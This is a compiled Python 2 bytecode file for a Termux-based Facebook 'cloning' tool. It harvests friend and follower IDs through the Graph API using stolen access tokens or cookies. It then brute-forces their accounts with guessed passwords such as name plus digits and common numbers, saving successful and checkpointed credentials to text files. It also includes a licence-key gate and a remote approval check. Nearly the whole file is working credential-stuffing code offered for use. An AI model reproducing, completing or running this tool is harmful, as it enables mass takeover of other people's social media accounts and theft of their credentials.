ó
 ÿc           @   s³  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d Z d Z e j d  y e j d  Wn e k
 rn Xe
 j d	 d
  Z e
 j d d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e j d  e j d  d Z d Z d Z xC e d k röe  d  Z! e! e k ród  GHe j" d!  d" Z n  q´Wd#   Z# d$   Z$ d%   Z% d&   Z& d'   Z' d(   Z( d)   Z) d*   Z* d+   Z+ d,   Z, d-   Z- d.   Z. d/   Z/ d0   Z0 d1   Z1 d2   Z/ d3   Z2 d4   Z3 e4 d5 k r¯e#   n  d S(6   i    iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionErrors   Zubair Zubis,   All rights reserved . Copyright  Zubair Zubis   termux-setup-storages   /sdcard/idsg    ÐsAg    8|Ai N  i@  s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines   git pullt   clears  
[1;92m  d8888b.    .d88b.    .d8888.   .d8888.
[1;92m  88  `8D   .8P  Y8.   88'  YP   88'  YP
[1;92m  88oooY'   88    88   `8bo.     `8bo.
[1;92m  88~~~b.   88    88     `Y8b.     `Y8b.
[1;92m  88   8D   `8b  d8'   db   8D   db   8D
[1;92m  Y8888P'    `Y88P'    `8888Y'   `8888Y'
[1;97m-----------------------------------------------
[1;92mâ£ PROGRAMER   : MUHAMMAD MUDASAR
[1;92mâ£ FACEBOOK    : MUHAMMAD MUDASAR
[1;92mâ£ WHATSAPP    : 03174050946
[1;97m-----------------------------------------------s   @#$%&-+()/BOSS-007t   trues)   [1;91m[1;91mENTER KEY.. [1;91m [1;91ms    [1;92m  Activated i   t   falsec          C   sF  t  j d  t GHd GHd GHt j d  t  j d  t GHd GHd GHd GHt j d  y t d d  j   }  Wn t t f k
 r t	   n Xt
 j d	  j } |  | k rú t  j d
  t  j d  t  j d  t  j d  t j d  t   nH t  j d  t GHd GHd GHd GHd |  GHt d  t  j d  t   d  S(   NR   t    s$      [1;92m            UPDATE BY ZUBIi   s+   [1;31;1mLOGIN KI LIYE APPROVAL LYLO PEHLY i   s   /sdcard/Android/.b.txtt   rs?   https://raw.githubusercontent.com/BOSS-007/Boss/main/server.txts   cd Boss && npm installs   fuser -k 5000/tcp &t   #s   cd Boss && node index.js &s   	Approved Faileds     [1;92mYour Id Is Not Approved s%    [1;92mCopy the id and send to Admins    [1;92mYour id : s   [1;93m Press enter to send ids$   xdg-open https://wa.me/+923174050946(   t   ost   systemt   logot   timet   sleept   opent   readt   KeyErrort   IOErrort   reg2t   requestst   gett   textt   log_menut	   raw_inputt   reg(   t   toR   (    (    s
   ajg_dec.pyR   7   s@    
	
c          C   s   t  j d  t GHd GHd GHt j   j d  }  d |  GHd GHt d  t  j d  t d	 d
  } | j |   | j	   t d  t
   d  S(   NR   s   	Approval not detecteds?    [1;92mCopy and press enter , then select whatsapp to continuei2   s
    Your id: R   s    Press enter to go to whatsapp s$   xdg-open https://wa.me/+923174050946s   /sdcard/Android/.b.txtt   ws&   [1;92m Press enter to check Approval (   R
   R   R   t   uuidt   uuid4t   hexR   R   t   writet   closeR   (   t   idt   sav(    (    s
   ajg_dec.pyR   \   s    	


c          C   sw   y t  d d  }  t   WnV t t f k
 rr t j d  t GHd d GHd GHd GHd GHd d GHd	 GHt   n Xd  S(
   Ns   access_token.txtR   R   i/   t   -s   [1;92m[1] Login With Facebooks   [1;92m[2] Login With Tokens   [1;92m[3] Login With CookiesR   (   R   t   menuR   R   R
   R   R   t
   log_menu_s(   t   t_check(    (    s
   ajg_dec.pyR   m   s    		c          C   sh   t  d  }  |  d k r" t   nB |  d k r8 t   n, |  d k rN t   n d GHd GHd GHt   d  S(   Ns   [1;96m=>> t   1t   2t   3R   s   \ Select valid option (   R   t   log_fbt	   log_tokent
   log_cookieR%   (   t   s(    (    s
   ajg_dec.pyR%   }   s    


c          C   s  t  j d  t GHd GHd d GHt d  }  t d  } y° t j d t d t  j } t	 j
 |  } d	 | k r¨ t d
 d  } | j | d	  | j   t   n? d | d k rÑ d GHt d  t   n d GHt d  t   Wn d GHd GHt  j d  n Xd  S(   NR   s   [1;31;1mLogin with id/passi/   R#   s   [1;92m Id/mail/no: s    [1;93mPassword: s   http://localhost:5000/auth?id=s   &pass=t   locs   access_token.txtR   s   www.facebook.comt   errors&    User must verify account before logins!   [1;92m Press enter to try again s    Id/Pass may be wrongs!    [1;92mPress enter to try again R   s   Exiting toolt   exit(   R
   R   R   R   R   R   t   uidt   pwdR   t   jsont   loadsR   R   R    R$   R*   (   t   lidt   pwdst   datat   qt   ts(    (    s
   ajg_dec.pyR*      s2    	




c          C   sf   t  j d  t GHd GHd d GHt d  }  d d GHt d d  } | j |   | j   t   d  S(   NR   s   [1;93mLogin with token[1;91mi/   R#   s!   [1;92mPaste Token Here : [1;91ms   access_token.txtR   (   R
   R   R   R   R   R   R    R$   (   t   tokt   t_s(    (    s
   ajg_dec.pyR+   ©   s    		
c          C   s  t  j d  t GHd GHd GHd GHyÂ t d  }  i
 d d 6d d 6d	 d
 6d d 6d d 6d d 6d d 6d d 6d d 6|  d 6} t j d d | } t j d | j  } | j	 d  } t
 d d  } | j |  | j   t   Wn t k
 rd GHd GHd GHt d  t   ng t k
 rFd GHd GHd GHt d  t   n7 t j j k
 r|d GHd GHd GHt d  t   n Xd  S(    NR   R   s   [1;31;1mLogin Cookiess    Paste cookies here: sl   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR'   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiesG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss	   (EAAA\w+)i   s   access_token.txtR   s   	Invalid cookiess!    [1;92mPress enter to try again (   R
   R   R   R   R   R   t   ret   searchR   t   groupR   R   R    R$   t   AttributeErrorR   t   UnboundLocalErrort
   exceptionst   SSLError(   R@   R7   t   c1t   c2t   hasilt   ok(    (    s
   ajg_dec.pyR,   ¶   sT    







c          C   s  t  j d  y t d d  j   }  Wn: t t f k
 rb d GHt GHd GHt j d  t	   n Xy3 t
 j d |   } t j | j  } | d } Wn t t f k
 rä t GHd GHd	 GHd GHt  j d
  t j d  t	   n< t
 j j k
 rt GHd GHd GHd GHt d  t   n Xt  j d  t GHt d d  j   } d | GHd d GHd GHd GHd GHd GHd GHd GHd d GHt   d  S(   NR   s   access_token.txtR   R   s    [1;31;1mLogin FB id to continuei   s+   https://graph.facebook.com/me?access_token=t   names   	 Account Cheekpoint[0;97ms   rm -rf access_token.txts!   	 Turn on mobile data/wifi[0;97ms6    [1;92mPress enter after turning on mobile data/wifi s   /sdcard/Android/.b.txts   [1;92mLogged in User : [1;91mi/   R#   s#   [1;92m[1] Crack With Auto Passwords$   [1;92m[2] Crack With Digit Passwords#   [1;92m[3] Crack With Name Passwords   [1;92m[4] Creat Files   [1;92m[5] Logouts   [1;92m[6] Delete trash files(   R
   R   R   R   R   R   R   R   R   R   R   R   R3   R4   R   RG   R   R   R$   t   menu_s(   t   tokenR   R8   t   zR:   (    (    s
   ajg_dec.pyR$   ã   sR    

			c          C   s°   t  d  }  |  d k r" t   n |  d k r8 t   nt |  d k rN t   n^ |  d k rj t j d  nB |  d k r t   n, |  d k r t   n d	 GHd
 GHd	 GHt   d  S(   Ns   [1;96m=>> R'   R(   R)   t   4s   python2 ok.pyt   5t   6R   s   	Select valid option(	   R   t
   auto_crackt   choice_crackt
   name_crackR
   R   t   loutt   rtrashRN   (   t   ms(    (    s
   ajg_dec.pyRN     s"    




c           C   s«   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHd d	 GHt   d  S(   Ns	   login.txtR   R   s   	 File Not Found [0;97mR   i   s    [1;93mAuto Pass Cracking[1;91mi/   R#   s   [1;92m[1] Public ID Clonings   [1;92m[2] Followers Clonings   [1;92m[3] File Clonings   [1;92m[0] Back(   R   R   t   toketR   R   R
   R   R   R   R   R   t   a_s(    (    (    s
   ajg_dec.pyt   crack&  s&    		c           C   s«   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHd d	 GHt   d  S(   Ns   access_token.txtR   R   s    	 Login FB id to continue[0;97mR   i   s"   [1;93m Auto Pass Cracking [1;91mi/   R#   s   [1;92m[1] Public ID Clonings   [1;92m[2] Followers Clonings   [1;92m[3] File Clonings   [1;92m[0] Back(   R   R   RO   R   R   R
   R   R   R   R   R   R[   (    (    (    s
   ajg_dec.pyRT   >  s&    		c             s  g  }  g    g   t  d  } | d k rkt j d  t GHd GHd d GHt  d  } yd t j d | d	 t  } t j | j	  } | d
 } t j d  t GHd GHd d GHd | GHWn- t
 t f k
 ré d GHt  d  t   n Xt j d | d t  } t j | j	  } x| d D]B } | d } | d
 } | j d  d }	 |  j | d |	  q"WnH| d k rìt j d  t GHd GHd d GHt  d  }
 t  d  } t  d  } t  d  } t  d  } yd t j d | d	 t  } t j | j	  } | d
 } t j d  t GHd GHd d GHd | GHWn- t
 t f k
 rfd GHt  d  t   n Xt j d | d t d  } t j | j	  } x| d D]B } | d } | d
 } | j d  d }	 |  j | d |	  q£WnÇ | d k rt j d  t GHd  GHd d GHyC t  d!  } x0 t | d"  j   D] } |  j | j    q=WWq³t k
 rd# GHt  d$  t   q³Xn+ | d% k rt   n d& GHd' t GH|   d( t t |    GHt j d)  d* GHt j d)  d d GHd+ GHd d GH   f d,   } t d-  } | j | |   d d GHd. GHd/ t t    d0 t t     GHd d GHt  d1  t   d  S(2   Ns   [1;96m=>> R'   R   s(   [1;93mAuto Pass Public Cracking [1;91mi/   R#   s    [1;93m[â] Enter id : s   https://graph.facebook.com/s   ?access_token=RM   s    [1;93mAuto Pass Public Crackings   [1;92mCloning from: s   	 Invalid user [0;97ms!    [1;92mPress enter to try again s   /friends?access_token=R7   R!   t    i    t   |R(   s+   [1;93mName Pass Followers Cracking [1;91ms    [1;92m[1] Name + digit : s    [1;92m[2] Name + digit : s    [1;92m[3] Name + digit : s    [1;92m[4] Name + digit : s$   [1;93mName Pass Followers Cracking s    [1;92mPress enter to try again s   /subscribers?access_token=s   &limit=999999R)   s&   [1;93mAuto Pass File Cracking [1;91ms   [+] File Name : R   s   [!] File Not Found.s   Press Enter To Back. t   0R   s   	Choose valid options   Total ids: g      à?s   [1;97mCrack Running[1;91m s*   	[1;93m     Mudasar King Of Facebook     c            s
  |  } | j  d  \ } } yr
| j   d } t j d | d | d t j } t j |  } d | k rÈ d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nÄ	d | d k r/d | d | GHt d d  } | j	 | d | d  | j
     j | |  n]	| j   d }	 t j d | d |	 d t j } t j |  } d | k rÙd | d |	 d	 GHt d
 d  } | j	 | d |	 d  | j
    j | |	  n³d | d k r@d | d |	 GHt d d  } | j	 | d |	 d  | j
     j | |	  nL| j   d }
 t j d | d |
 d t j } t j |  } d | k rêd | d |
 d	 GHt d
 d  } | j	 | d |
 d  | j
    j | |
  n¢d | d k rQd | d |
 GHt d d  } | j	 | d |
 d  | j
     j | |
  n;| j   d } t j d | d | d t j } t j |  } d | k rûd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nd | d k rbd | d | GHt d d  } | j	 | d | d  | j
     j | |  n*d } t j d | d | d t j } t j |  } d | k rd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nd | d k rid | d | GHt d d  } | j	 | d | d  | j
     j | |  n#d } t j d | d | d t j } t j |  } d | k r	d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nd | d k rpd | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k rd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  n|d | d k rwd | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k rd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nud | d k r~d | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k r	d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nnd | d k r	d | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k r%
d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  ng d | d k r
d | d | GHt d d  } | j	 | d | d  | j
     j | |  n  Wn n Xd  S(   NR^   t   12s   http://localhost:5000/auth?id=s   &pass=RA   R.   s   [1;92m[BOSS-OK] [1;32ms    | s   [0;97ms   ZUBI_OK.txtt   as   
s   www.facebook.comR/   s   [1;31;1m[BOSS-CP] s   ZUBI_CP.txtt   1234t   786t   123t   234567t   223344t   334455t   445566t   000786t   786000(   t   splitt   lowerR   R   t   headerR   R3   R4   R   R   R    t   appendt   apppend(   t   argt   userR1   RM   t   pass1R7   R8   RL   t   cpt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8t   pass9t   pass10(   t   cpst   oks(    s
   ajg_dec.pyt   main´  s6   $

$

$

$

$

$

$

$

$

$

i   s    [1;92mSuccessfully Dones    [1;92mTotal Ok/Cp:t   /s    [1;93mPress enter to back(   R   R
   R   R   R   R   RO   R3   R4   R   R   R   RT   t   rsplitRn   R   t	   readlinest   stripR\   R$   R   t   strt   lenR   R   R    t   map(   R!   R[   t   idtR   R8   RP   t   iR1   t   nat   nmt   p1t   p2t   p3t   p4t   idlistt   lineR   t   p(    (   R}   R~   s
   ajg_dec.pyR[   V  s¼    	
	


	
	


	

			¦	)	
c           C   s¦   y t  d d  j   a WnB t t f k
 r] t j d  t GHd GHt j	 d  t
   n Xt j d  t GHd GHd d GHd	 GHd
 GHd GHd GHd d GHt   d  S(   Ns	   login.txtR   R   s   	 File Not Found [0;97mi   s"   [1;93mDigit Pass Cracking [1;91mi/   R#   s   [1;92m[1] Public ID Clonings   [1;92m[2] Followers Clonings   [1;92m[3] File Clonings   [1;92m[0] Back(   R   R   RZ   R   R   R
   R   R   R   R   R   t   c_s(    (    (    s
   ajg_dec.pyt   crack_bd  s$    		c           C   s¦   y t  d d  j   a WnB t t f k
 r] t j d  t GHd GHt j	 d  t
   n Xt j d  t GHd GHd d GHd	 GHd
 GHd GHd GHd d GHt   d  S(   Ns   access_token.txtR   R   s   [1;93mLogin FB ID To Continue i   s"   [1;93mDigit Pass Cracking [1;91mi/   R#   s   [1;92m[1] Public ID Clonings   [1;92m[2] Followers Clonings   [1;92m[3] File Clonings   [1;92m[0] Back(   R   R   RO   R   R   R
   R   R   R   R   R   R   (    (    (    s
   ajg_dec.pyRU   {  s$    		c             s;  g  }  g    g   t  d  } | d k r³t j d  t GHd GHd d GHt  d   t  d   t  d	   t  d
   t  d   t  d   t  d  } yd t j d | d t  } t j | j	  } | d } t j d  t GHd GHd d GHd | GHWn- t
 t f k
 r1d GHt  d  t   n Xt j d | d t  } t j | j	  } xù| d D]B } | d } | d } | j d  d }	 |  j | d |	  qjWn¨| d k rLt j d  t GHd GHd d GHt  d   t  d   t  d	   t  d
   t  d   t  d   t  d  } yd t j d | d t  } t j | j	  } | d } t j d  t GHd GHd d GHd | GHWn- t
 t f k
 rÆd GHt  d  t   n Xt j d | d t d   } t j | j	  } x`| d D]B } | d } | d } | j d  d }	 |  j | d |	  qWn| d! k r0t j d  t GHd" GHd d GHt  d   t  d   t  d	   t  d
   t  d   t  d   yC t  d#  }
 x0 t |
 d$  j   D] } |  j | j    qåWWq[t k
 r,d% GHt  d&  t   q[Xn+ | d' k rFt   n d( GHd) t GHt   d* t t |    GHt j d+  d, GHt j d+  d d GHd- GHd d GH         f d.   } t d/  } | j | |   d d GHd0 GHd1 t t    d2 t t     GHd d GHt  d3  t   d  S(4   Ns   [1;96m=>> R'   R   s)   [1;93mDigit Pass Public Cracking [1;91mi/   R#   s    [1;92m[1] Password : s    [1;92m[2] Password : s    [1;92m[3] Password : s    [1;92m[4] Password : s    [1;92m[5] Password : s    [1;92m[6] Password : s    [1;93m[â] Enter id : s   https://graph.facebook.com/s   ?access_token=RM   s"   [1;93mDigit Pass Public Cracking s   Cloning from: s   	 Invalid user [0;97ms    Press enter to try again s   /friends?access_token=R7   R!   R]   i    R^   R(   s,   [1;93mDigit Pass Followers Cracking [1;91ms%   [1;93mDigit Pass Followers Cracking s   Press enter to try again s   /subscribers?access_token=s   &limit=999999R)   s'   [1;93mDigit Pass File Cracking [1;91ms    [+] File Name : R   s   [!] File Not Found.s   Press Enter To Back. R_   R   s   	 Choose valid options   Total ids: g      à?s   [1;97mCrack Running [1;91ms*   	[1;93m     Mudasar King Of Facebook     c            s3  |  } | j  d  \ } } y
t j d | d  d t j } t j |  } d | k r¸ d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nld | d k rd | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r¹d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nkd | d k r d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k rºd | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   njd | d k r!d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r»d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nid | d k r"d | d  GHt d d
  } | j | d  d  | j	     j |   nt j d | d  d t j } t j |  } d | k r¼d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nhd | d k r#d | d  GHt d d
  } | j | d  d  | j	     j |   nt j d | d  d t j } t j |  } d | k r½d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   ng d | d k r$d | d  GHt d d
  } | j | d  d  | j	     j |   n  Wn n Xd  S(   NR^   s   http://localhost:5000/auth?id=s   &pass=RA   R.   s   [1;92m[BOSS-OK] [1;32ms    | s   [0;97ms   ZUBI_OK.txtRa   s   
s   www.facebook.comR/   s   [1;31;1m[BOSS-CP] s   ZUBI_CP.txt(   Rk   R   R   Rm   R   R3   R4   R   R   R    Rn   Ro   (   Rp   Rq   R1   RM   R7   R8   RL   Rs   (   R}   R~   Rr   Rt   Ru   Rv   Rw   Rx   (    s
   ajg_dec.pyR   þ  s²    $

$

$

$

$

$

i   s   [1;92mSuccessfully Dones   [1;92m Total Ok/Cp:R   s   [1;93m Press enter to back(   R   R
   R   R   R   R   RO   R3   R4   R   R   R   RU   R   Rn   RT   R   R   R   R   R$   R   R   R   R   R   R   R    R   (   R!   R[   R   R   R8   RP   R   R1   R   R   R   R   R   R   (    (   R}   R~   Rr   Rt   Ru   Rv   Rw   Rx   s
   ajg_dec.pyR     sØ    	
	


	
	


	

			$`	)	
c           C   s«   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHd d	 GHt   d  S(   Ns	   login.txtR   R   s   	 File Not Found [0;97mR   i   s!   [1;93mName Pass Cracking [1;91mi/   R#   s   [1;92m[1] Public ID Clonings   [1;92m[2] Followers Clonings   [1;92m[3] File Clonings   [1;92m[0] Back(   R   R   RZ   R   R   R
   R   R   R   R   R   R[   (    (    (    s
   ajg_dec.pyR   g  s&    		c           C   s«   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHd d	 GHt   d  S(   Ns   access_token.txtR   R   s    	 Login FB id to continue[0;97mR   i   s!   [1;93mName Pass Cracking [1;91mi/   R#   s   [1;92m[1] Public ID Clonings   [1;92m[2] Followers Clonings   [1;92m[3] File Clonings   [1;92m[0] Back(   R   R   RO   R   R   R
   R   R   R   R   R   t   n_s(    (    (    s
   ajg_dec.pyRV     s&    		c             sí  g  }  g    g   t  d  } | d k rt j d  t GHd GHd d GHt  d   t  d   t  d	   t  d
   t  d  } yd t j d | d t  } t j | j	  } | d } t j d  t GHd GHd d GHd | GHWn- t
 t f k
 rd GHt  d  t   n Xt j d | d t  } t j | j	  } xÉ| d D]B } | d } | d } | j d  d }	 |  j | d |	  qRWnx| d k rt j d  t GHd GHd d GHt  d   t  d   t  d	   t  d
   t  d  } yd t j d | d t  } t j | j	  } | d } t j d  t GHd GHd d GHd | GHWn- t
 t f k
 rd GHt  d  t   n Xt j d | d t d  } t j | j	  } xH| d D]B } | d } | d } | j d  d }	 |  j | d |	  qÓWn÷ | d k rèt j d  t GHd  GHd d GHt  d   t  d   t  d	   t  d
   yC t  d!  }
 x0 t |
 d"  j   D] } |  j | j    qWWqt k
 räd# GHt  d$  t   qXn+ | d% k rþt   n d& GHd' t GH|   d( t t |    GHt j d)  d* GHt j d)  d d GHd+ GHd d GH       f d,   } t d-  } | j | |   d d GHd. GHd/ t t    d0 t t     GHd d GHt  d1  t   d  S(2   Ns   [1;96m=>> R'   R   s(   [1;93mName Pass Public Cracking [1;91mi/   R#   s    [1;92m[1] Name + digit : s    [1;92m[2] Name + digit : s    [1;92m[3] Name + digit : s    [1;92m[4] Name + digit : s    [1;93m[â] Enter id : s   https://graph.facebook.com/s   ?access_token=RM   s!   [1;93mName Pass Public Cracking s   [1;92mCloning from: s   	 Invalid user [0;97ms!    [1;92mPress enter to try again s   /friends?access_token=R7   R!   R]   i    R^   R(   s+   [1;93mName Pass Followers Cracking [1;91ms$   [1;93mName Pass Followers Cracking s    [1;92mPress enter to try again s   /subscribers?access_token=s   &limit=999999R)   s&   [1;93mName Pass File Cracking [1;91ms   [+] File Name : R   s   [!] File Not Found.s   Press Enter To Back. R_   R   s   	Choose valid options   Total ids: g      à?s   [1;97mCrack Running[1;91m s*   	[1;93m     Mudasar King Of Facebook     c            sq  |  } | j  d  \ } } yH| j    } t j d | d | d t j } t j |  } d | k rÈ d | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  nd | d k r/d | d | GHt d d
  } | j	 | d | d  | j
     j | |  n3| j    }	 t j d | d |	 d t j } t j |  } d | k rÙd | d |	 d GHt d	 d
  } | j	 | d |	 d  | j
    j | |	  nd | d k r@d | d |	 GHt d d
  } | j	 | d |	 d  | j
     j | |	  n"| j    }
 t j d | d |
 d t j } t j |  } d | k rêd | d |
 d GHt d	 d
  } | j	 | d |
 d  | j
    j | |
  nxd | d k rQd | d |
 GHt d d
  } | j	 | d |
 d  | j
     j | |
  n| j    } t j d | d | d t j } t j |  } d | k rûd | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  ng d | d k rbd | d | GHt d d
  } | j	 | d | d  | j
     j | |  n  Wn n Xd  S(   NR^   s   http://localhost:5000/auth?id=s   &pass=RA   R.   s   [1;92m[BOSS-OK] [1;32ms    | s   [0;97ms   ZUBI_OK.txtRa   s   
s   www.facebook.comR/   s   [1;31;1m[BOSS-CP] s   ZUBI_CP.txt(   Rk   Rl   R   R   Rm   R   R3   R4   R   R   R    Rn   Ro   (   Rp   Rq   R1   RM   Rr   R7   R8   RL   Rs   Rt   Ru   Rv   (   R}   R~   R   R   R   R   (    s
   ajg_dec.pyR   ý  s    $

$

$

$

i   s   [1;92mSuccessfully Dones   [1;92mTotal Ok/Cp:R   s    [1;93mPress enter to back(   R   R
   R   R   R   R   RO   R3   R4   R   R   R   RV   R   Rn   RT   R   R   R   R\   R$   R   R   R   R   R   R    R   (   R!   R[   R   R   R8   RP   R   R1   R   R   R   R   R   R   (    (   R}   R~   R   R   R   R   s
   ajg_dec.pyR     sÌ    	
	


	
	


	

			F	)	
t   __main__(5   t   Falset   foot   barR
   t   sysR   t   datetimeRB   t	   threadingR3   t   randomR   t   hashlibt	   cookielibR   t   multiprocessing.poolR    t   requests.exceptionsR   t
   __author__t   __copyrightR   t   mkdirt   OSErrort   randintt   bdt   simt   reprRm   R   t   CorrectUsernamet   loopR   t   usernameR   R   R   R   R%   R*   R+   R,   R$   RN   R\   RT   R[   R   RU   R   RV   R   t   __name__(    (    (    s
   ajg_dec.pyt   <module>   sn   

	%						-	.				ÿ 			Õ			¶